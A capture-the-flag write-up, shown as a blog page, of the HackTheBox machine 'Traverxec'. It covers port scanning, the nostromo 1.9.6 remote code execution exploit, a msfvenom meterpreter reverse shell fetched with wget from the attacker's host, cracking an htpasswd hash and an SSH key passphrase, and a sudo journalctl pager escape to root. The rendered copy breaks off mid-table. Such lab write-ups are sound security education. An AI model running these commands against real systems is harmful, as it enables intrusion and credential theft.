<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Traverxec | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,easy"><meta name=description content="Traverxec HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/traverxec/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/traverxec/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Traverxec "><meta property="og:description" content="Traverxec HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/traverxec/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/traverxec/traverxec.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-04-12T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/traverxec/traverxec.png"><meta name=twitter:title content="Traverxec "><meta name=twitter:description content="Traverxec HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Traverxec ","item":"https://s4ch.github.io/writeups/hackthebox/traverxec/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Traverxec ","name":"Traverxec ","description":"Traverxec HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","easy"],"articleBody":"≡ƒÆó Info Name: Traverxec Profile: www.hackthebox.eu Difficulty: Easy OS: Linux Points: 20 Overview Network enumeration: 80 and 22 ports are open Webapp enumeration: nostromo 1.9.6 Webapp exploit: nostromo 1.9.6 RCE python exploit + meterpreter Privilege Escalation of Machine : www-data to david: check nostromo conf, find user web dirs, find archive containing a SSH key, crack it and use it to gain SSH access Privilege Escalation of Machine : david to root: journalctl pe Network enumeration TL;DR: 80 and 22 ports are open\nI’ll make it quick you know how to run a nmap scan, I just ran something like nmap -sS -p- 10.10.10.165 -oA nmap_ports, found that port 22 and 80 are open and then ran nmap -sSVC -p 22,80 10.10.10.165 -oA nmap_services but one could simply run nmap -A 10.10.10.165.\nThe web app on port 80 is more likely vulnerable than the SSH server on port 22.\nWebapp enumeration TL;DR: nostromo 1.9.6\nWhen running some directory busting with tools like dirsearch or ffuf, you will probably find a lot of HTTP error 501, for example when a space is added in the path: http://10.10.10.165/%20.\nIt’s alway worth it to take a look at error message are it could leak the software name and version. You would be able to see a message like this one.\n1 2 501 Not Implemented nostromo 1.9.6 at traverxec.htb Port 80 Webapp exploit TL;DR: nostromo 1.9.6 RCE python exploit + meterpreter\nWe could immediately use searchsploit to browse ExploitDB to find an exploit for nostromo.\n1 2 3 4 5 6 7 8 searchsploit nostromo 1.9.6 -------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) -------------------------------------------------------------------------------------------- ---------------------------------------- nostromo 1.9.6 - Remote Code Execution | exploits/multiple/remote/47837.py -------------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result The exploit is also available on Metasploit:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 msf5 \u003e search nostromo_code_exec Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/nostromo_code_exec 2019-10-20 good Yes Nostromo Directory Traversal Remote Command Execution msf5 \u003e use 0 msf5 exploit(multi/http/nostromo_code_exec) \u003e options Module options (exploit/multi/http/nostromo_code_exec): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 80 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic (Unix In-Memory) But the perl reverse shell obtained with MSF was really unstable even when upgrading it to bash with python -c 'import pty; pty.spawn(\"/bin/bash\")'.\nSo I put the MSF shell in background and choose to use the python exploit the upload and execute a meterpreter reverse shell.\nWe could nearly directly execute it from EDB but we need to remove a line to be able to execute it.\n1 $ sed '10d' /usr/share/exploitdb/exploits/multiple/remote/47837.py | python - 10.10.10.165 80 id Port 4444 was not reached back so I generated a reverse shell for port 80 with msfvenom.\n1 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=80 -f elf \u003e 80.bin Then started a new MSF console as root to be able to bind port 80 and start a listener:\n1 2 3 4 5 6 7 8 9 $ sudo msfconsole msf5 \u003e use exploit/multi/handler msf5 exploit(multi/handler) \u003e set LHOST 10.10.14.236 LHOST =\u003e 10.10.14.236 msf5 exploit(multi/handler) \u003e set payload linux/x64/meterpreter/reverse_tcp payload =\u003e linux/x64/meterpreter/reverse_tcp msf5 exploit(multi/handler) \u003e set LPORT 80 LPORT =\u003e 80 Then I witched back to my first MSF session with session -i and downloaded the reverse shell bin.\n1 wget http://10.10.14.236/80.bin -o /tmp/80.bin Then chmod and execute it.\nPrivilege Escalation of Machine : www-data to david TL;DR: check nostromo conf, find user web dirs, find archive containing a SSH key, crack it and use it to gain SSH access\nNow that we have a proper shell let’s see what can we find on the system.\nWe can start by reading nostromo configuration file /var/nostromo/conf/nhttpd.conf.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # MAIN [MANDATORY] servername traverxec.htb serverlisten * serveradmin david@traverxec.htb serverroot /var/nostromo servermimes conf/mimes docroot /var/nostromo/htdocs docindex index.html # LOGS [OPTIONAL] logpid logs/nhttpd.pid # SETUID [RECOMMENDED] user www-data # BASIC AUTHENTICATION [OPTIONAL] htaccess .htaccess htpasswd /var/nostromo/conf/.htpasswd # ALIASES [OPTIONAL] /icons /var/nostromo/icons # HOMEDIRS [OPTIONAL] homedirs /home homedirs_public public_www What is useful to know in it?\nserveradmin david@traverxec.htb –\u003e The admin is david user www-data –\u003e the webserver user is www-data but we already know it by executing id htaccess .htaccess –\u003e Some part of the website is protected by a basic auth htpasswd /var/nostromo/conf/.htpasswd –\u003e the location of the basic auth creds homedirs /home –\u003e users are able to serve a website in their home directory homedirs_public public_www –\u003e the root folder of user web server is ~/public_www/ Then we can find the basic auth creds in /var/nostromo/conf/.htpasswd:\n1 david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ We can crack the password with John the Ripper (JtR):\n1 2 3 4 5 6 7 8 9 10 11 12 13 john --wordlist=/usr/share/wordlists/password/rockyou.txt pass Warning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Warning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-opencl\" Use the \"--format=md5crypt-opencl\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3]) Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status Nowonly4me (david) 1g 0:00:01:54 DONE (2020-03-12 16:00) 0.008768g/s 92750p/s 92750c/s 92750C/s Noyoo..NovemberRain Use the \"--show\" option to display all of the cracked passwords reliably Session completed So the basic auth creds are david / Nowonly4me.\nDavid home web server is stored in /home/david/public_www/ and is served as http://10.10.10.165/~david/.\nLet’s see what is stored in /home/david/public_www/:\n1 2 3 4 5 6 7 8 9 10 11 ls -lhA /home/david/public_www total 8.0K -rw-r--r-- 1 david david 402 Oct 25 15:45 index.html drwxr-xr-x 2 david david 4.0K Oct 25 17:02 protected-file-area ls -lha /home/david/public_www/protected-file-area total 16K drwxr-xr-x 2 david david 4.0K Oct 25 17:02 . drwxr-xr-x 3 david david 4.0K Oct 25 15:45 .. -rw-r--r-- 1 david david 45 Oct 25 15:46 .htaccess -rw-r--r-- 1 david david 1.9K Oct 25 17:02 backup-ssh-identity-files.tgz We could access http://10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz with the basic auth creds we leaked earlier or just copy /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz.\nThen we can see what’s inside the archive and extract it:\n1 2 3 4 5 6 7 $ tar tvf backup-ssh-identity-files.tgz drwx------ david/david 0 2019-10-25 23:02 home/david/.ssh/ -rw-r--r-- david/david 397 2019-10-25 23:02 home/david/.ssh/authorized_keys -rw------- david/david 1766 2019-10-25 23:02 home/david/.ssh/id_rsa -rw-r--r-- david/david 397 2019-10-25 23:02 home/david/.ssh/id_rsa.pub $ tar xaf backup-ssh-identity-files.tgz The private key is encrypted and password protected, so we need to crack it to be able to use it.\nSo I converted the RSA private key in a format understandable by JtR and cracked it:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ ssh2john home/david/.ssh/id_rsa /usr/bin/ssh2john:103: DeprecationWarning: decodestring() is a deprecated alias since Python 3.1, use decodebytes() data = base64.decodestring(data) home/david/.ssh/id_rsa:$sshng$1$16$477EEFFBA56F9D283D349033D5D08C4F$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672f993e494b90e9de220828aee2e45465b8938eb9d69c1e9199e3b13f0830cde39dd2cd491923c424d7dd62b35bd5453ee8d24199c733d261a3a27c3bc2d3ce5face868cfa45c63a3602bda73f08e87dd41e8cf05e3bb917c0315444952972c02da4701b5da248f4b1725fc22143c7eb4ce38bb81326b92130873f4a563c369222c12f2292fac513f7f57b1c75475b8ed8fc454582b1172aed0e3fcac5b5850b43eee4ee77dbedf1c880a27fe906197baf6bd005c43adbf8e3321c63538c1abc90a79095ced7021cbc92ffd1ac441d1dd13b65a98d8b5e4fb59ee60fcb26498729e013b6cff63b29fa179c75346a56a4e73fbcc8f06c8a4d5f8a3600349bb51640d4be260aaf490f580e3648c05940f23c493fd1ecb965974f464dea999865cfeb36408497697fa096da241de33ffd465b3a3fab925703a8e3cab77dc590cde5b5f613683375c08f779a8ec70ce76ba8ecda431d0b121135512b9ef486048052d2cfce9d7a479c94e332b92a82b3d609e2c07f4c443d3824b6a8b543620c26a856f4b914b38f2cfb3ef6780865f276847e09fe7db426e4c319ff1e810aec52356005aa7ba3e1100b8dd9fa8b6ee07ac464c719d2319e439905ccaeb201bae2c9ea01e08ebb9a0a9761e47b841c47d416a9db2686c903735ebf9e137f3780b51f2b5491e50aea398e6bba862b6a1ac8f21c527f852158b5b3b90a6651d21316975cd543709b3618de2301406f3812cf325d2986c60fdb727cadf3dd17245618150e010c1510791ea0bec870f245bf94e646b72dc9604f5acefb6b28b838ba7d7caf0015fe7b8138970259a01b4793f36a32f0d379bf6d74d3a455b4dd15cda45adcfdf1517dca837cdaef08024fca3a7a7b9731e7474eddbdd0fad51cc7926dfbaef4d8ad47b1687278e7c7474f7eab7d4c5a7def35bfa97a44cf2cf4206b129f8b28003626b2b93f6d01aea16e3df597bc5b5138b61ea46f5e1cd15e378b8cb2e4ffe7995b7e7e52e35fd4ac6c34b716089d599e2d1d1124edfb6f7fe169222bc9c6a4f0b6731523d436ec2a15c6f147c40916aa8bc6168ccedb9ae263aaac078614f3fc0d2818dd30a5a113341e2fcccc73d421cb711d5d916d83bfe930c77f3f99dba9ed5cfcee020454ffc1b3830e7a1321c369380db6a61a757aee609d62343c80ac402ef8abd56616256238522c57e8db245d3ae1819bd01724f35e6b1c340d7f14c066c0432534938f5e3c115e120421f4d11c61e802a0796e6aaa5a7f1631d9ce4ca58d67460f3e5c1cdb2c5f6970cc598805abb386d652a0287577c453a159bfb76c6ad4daf65c07d386a3ff9ab111b26ec2e02e5b92e184e44066f6c7b88c42ce77aaa918d2e2d3519b4905f6e2395a47cad5e2cc3b7817b557df3babc30f799c4cd2f5a50b9f48fd06aaf435762062c4f331f989228a6460814c1c1a777795104143630dc16b79f51ae2dd9e008b4a5f6f52bb4ef38c8f5690e1b426557f2e068a9b3ef5b4fe842391b0af7d1e17bfa43e71b6bf16718d67184747c8dc1fcd1568d4b8ebdb6d55e62788553f4c69d128360b407db1d278b5b417f4c0a38b11163409b18372abb34685a30264cdfcf57655b10a283ff0 $ john --wordlist=/usr/share/wordlists/password/rockyou.txt john.txt Warning: detected hash type \"SSH\", but the string is also recognized as \"ssh-opencl\" Use the \"--format=ssh-opencl\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 2 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press 'q' or Ctrl-C to abort, almost any other key for status hunter (?) Warning: Only 1 candidate left, minimum 2 needed for performance. 1g 0:00:00:07 DONE (2020-03-12 17:38) 0.1396g/s 2003Kp/s 2003Kc/s 2003KC/s *7┬íVamos! Session completed We can finally connect via SSH as david:\n1 2 3 4 5 $ ssh david@10.10.10.165 -i home/david/.ssh/id_rsa Enter passphrase for key 'home/david/.ssh/id_rsa': Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 Last login: Thu Mar 12 12:27:40 2020 from 10.10.15.152 david@traverxec:~$ Privilege Escalation of Machine : david to root TL;DR: journalctl pe\nIn david home directory there is a folder named bin containing:\n1 2 david@traverxec:~$ ls bin server-stats.head server-stats.sh The server-stats.sh is our way to root:\n1 2 3 4 5 6 7 8 9 10 #!/bin/bash cat /home/david/bin/server-stats.head echo \"Load: `/usr/bin/uptime`\" echo \" \" echo \"Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`\" echo \"Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`\" echo \" \" echo \"Last 5 journal log lines:\" /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat It seems we can execute journalctl as root so let’s check on GTFOBins if there is a way to upgrade our privileges.\nOf course there is!\nLike with git, journalctl will use a pager when the output is too large.\nBut to trigger the pager, we need to resize our terminal to be smaller than the text output.\nThe we execute /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service and in the pager we just have to write !/bin/bash to get a shell as root.\nThat’s it we are root.\n","wordCount":"1664","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/traverxec/traverxec.png","datePublished":"2020-04-12T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/traverxec/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Traverxec</h1><div class=post-description>Traverxec HackTheBox writeup</div><div class=post-meta><span title='2020-04-12 00:00:00 +0000 UTC'>April 12, 2020</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1664 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/easy/ class=post-tag title=easy>easy</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/traverxec/traverxec.png alt="Traverxec HackTheBox Machine"><p>Traverxec - Easy Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#ƒæó-info>≡ƒÆó Info</a></li></ul><ul><li><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#webapp-enumeration>Webapp enumeration</a></li><li><a href=#webapp-exploit>Webapp exploit</a></li><li><a href=#privilege-escalation-of-machine--www-data-to-david>Privilege Escalation of Machine : www-data to david</a></li><li><a href=#privilege-escalation-of-machine--david-to-root>Privilege Escalation of Machine : david to root</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=ƒæó-info>≡ƒÆó Info<a hidden class=anchor aria-hidden=true href=#ƒæó-info>#</a></h2><h1></h1><ul><li><strong>Name:</strong> Traverxec</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/217>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 20</li></ul><h1></h1><h3 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h3><ul><li><strong>Network enumeration</strong>: <code>80</code> and <code>22</code> ports are open</li><li><strong>Webapp enumeration</strong>: <code>nostromo 1.9.6</code></li><li><strong>Webapp exploit</strong>: <code>nostromo 1.9.6</code> RCE python exploit + meterpreter</li><li><strong>Privilege Escalation of Machine : www-data to david</strong>: check nostromo conf, find user web dirs, find archive containing a SSH key, crack it and use it to gain SSH access</li><li><strong>Privilege Escalation of Machine : david to root</strong>: <code>journalctl</code> pe</li></ul><h3 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h3><p><strong>TL;DR</strong>: <code>80</code> and <code>22</code> ports are open</p><p>I&rsquo;ll make it quick you know how to run a <a href=https://nmap.org/>nmap</a> scan, I just ran something like
<code>nmap -sS -p- 10.10.10.165 -oA nmap_ports</code>, found that port <code>22</code> and <code>80</code> are
open and then ran <code>nmap -sSVC -p 22,80 10.10.10.165 -oA nmap_services</code> but one
could simply run <code>nmap -A 10.10.10.165</code>.</p><p>The web app on port 80 is more likely vulnerable than the SSH server on port 22.</p><h3 id=webapp-enumeration>Webapp enumeration<a hidden class=anchor aria-hidden=true href=#webapp-enumeration>#</a></h3><p><strong>TL;DR</strong>: <code>nostromo 1.9.6</code></p><p>When running some directory busting with tools like <a href=https://github.com/maurosoria/dirsearch>dirsearch</a> or
<a href=https://github.com/ffuf/ffuf>ffuf</a>, you will probably find a lot of HTTP error 501, for example
when a space is added in the path: <code>http://10.10.10.165/%20</code>.</p><p>It&rsquo;s alway worth it to take a look at error message are it could leak the
software name and version.
You would be able to see a message like this one.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>501 Not Implemented
</span></span><span class=line><span class=cl>nostromo 1.9.6 at traverxec.htb Port 80
</span></span></code></pre></td></tr></table></div></div><h3 id=webapp-exploit>Webapp exploit<a hidden class=anchor aria-hidden=true href=#webapp-exploit>#</a></h3><p><strong>TL;DR</strong>: <code>nostromo 1.9.6</code> RCE python exploit + meterpreter</p><p>We could immediately use <code>searchsploit</code> to browse ExploitDB to find an exploit
for <code>nostromo</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>searchsploit nostromo 1.9.6
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------------------- ----------------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                                              |  Path
</span></span><span class=line><span class=cl>                                                                                            | (/usr/share/exploitdb/)
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------------------- ----------------------------------------
</span></span><span class=line><span class=cl>nostromo 1.9.6 - Remote Code Execution                                                      | exploits/multiple/remote/47837.py
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------------------- ----------------------------------------
</span></span><span class=line><span class=cl>Shellcodes: No Result
</span></span></code></pre></td></tr></table></div></div><p>The exploit is also available on <a href=https://www.metasploit.com/>Metasploit</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>msf5</span> <span class=o>&gt;</span> <span class=n>search</span> <span class=n>nostromo_code_exec</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Matching</span> <span class=n>Modules</span>
</span></span><span class=line><span class=cl><span class=o>================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=c1>#  Name                                   Disclosure Date  Rank  Check  Description</span>
</span></span><span class=line><span class=cl>   <span class=o>-</span>  <span class=o>----</span>                                   <span class=o>---------------</span>  <span class=o>----</span>  <span class=o>-----</span>  <span class=o>-----------</span>
</span></span><span class=line><span class=cl>   <span class=mi>0</span>  <span class=n>exploit</span><span class=o>/</span><span class=n>multi</span><span class=o>/</span><span class=n>http</span><span class=o>/</span><span class=n>nostromo_code_exec</span>  <span class=mi>2019</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>20</span>       <span class=n>good</span>  <span class=n>Yes</span>    <span class=n>Nostromo</span> <span class=ne>Directory</span> <span class=n>Traversal</span> <span class=n>Remote</span> <span class=n>Command</span> <span class=n>Execution</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=o>&gt;</span> <span class=n>use</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>exploit</span><span class=p>(</span><span class=n>multi</span><span class=o>/</span><span class=n>http</span><span class=o>/</span><span class=n>nostromo_code_exec</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>options</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Module</span> <span class=n>options</span> <span class=p>(</span><span class=n>exploit</span><span class=o>/</span><span class=n>multi</span><span class=o>/</span><span class=n>http</span><span class=o>/</span><span class=n>nostromo_code_exec</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=n>Name</span>     <span class=n>Current</span> <span class=n>Setting</span>  <span class=n>Required</span>  <span class=n>Description</span>
</span></span><span class=line><span class=cl>   <span class=o>----</span>     <span class=o>---------------</span>  <span class=o>--------</span>  <span class=o>-----------</span>
</span></span><span class=line><span class=cl>   <span class=n>Proxies</span>                   <span class=n>no</span>        <span class=n>A</span> <span class=n>proxy</span> <span class=n>chain</span> <span class=n>of</span> <span class=n>format</span> <span class=n>type</span><span class=p>:</span><span class=n>host</span><span class=p>:</span><span class=n>port</span><span class=p>[,</span><span class=n>type</span><span class=p>:</span><span class=n>host</span><span class=p>:</span><span class=n>port</span><span class=p>][</span><span class=o>...</span><span class=p>]</span>
</span></span><span class=line><span class=cl>   <span class=n>RHOSTS</span>                    <span class=n>yes</span>       <span class=n>The</span> <span class=n>target</span> <span class=n>host</span><span class=p>(</span><span class=n>s</span><span class=p>),</span> <span class=nb>range</span> <span class=n>CIDR</span> <span class=n>identifier</span><span class=p>,</span> <span class=ow>or</span> <span class=n>hosts</span> <span class=n>file</span> <span class=n>with</span> <span class=n>syntax</span> <span class=s1>&#39;file:&lt;path&gt;&#39;</span>
</span></span><span class=line><span class=cl>   <span class=n>RPORT</span>    <span class=mi>80</span>               <span class=n>yes</span>       <span class=n>The</span> <span class=n>target</span> <span class=n>port</span> <span class=p>(</span><span class=n>TCP</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=n>SRVHOST</span>  <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span>          <span class=n>yes</span>       <span class=n>The</span> <span class=n>local</span> <span class=n>host</span> <span class=n>to</span> <span class=n>listen</span> <span class=n>on</span><span class=o>.</span> <span class=n>This</span> <span class=n>must</span> <span class=n>be</span> <span class=n>an</span> <span class=n>address</span> <span class=n>on</span> <span class=n>the</span> <span class=n>local</span> <span class=n>machine</span> <span class=ow>or</span> <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span>
